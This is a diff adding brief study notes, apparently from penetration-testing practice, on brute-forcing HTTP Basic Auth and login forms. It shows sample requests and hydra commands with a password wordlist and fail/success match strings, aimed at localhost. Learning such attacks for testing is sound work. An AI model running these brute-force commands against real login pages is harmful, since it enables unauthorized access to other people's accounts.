@@ -1,0 +1,26 @@
+BASIC AUTH REQUEST LOOKS LIKE:
+GET /protected_resource HTTP/1.1
+Host: www.example.com
+Authorization: Basic YWxpY2U6c2VjcmV0MTIz
+
+Which can be brute-forced like:
+hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
+
+!!! IT LOOKS LIKEE A SIMPLE SIGN-IN FORM PAGE !!!
+
+
+LOGIN FORM REQUESTS LOOK LIKE:
+POST /login HTTP/1.1
+Host: www.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+
+username=john&password=secret123
+
+
+Which can be brute-forced like:
+hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
+(F=<thinghere> signals a fail condition, and hydra will not stop when failing)
+
+hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"
+(S=<thinghere> signals a success, and hydra will note this)
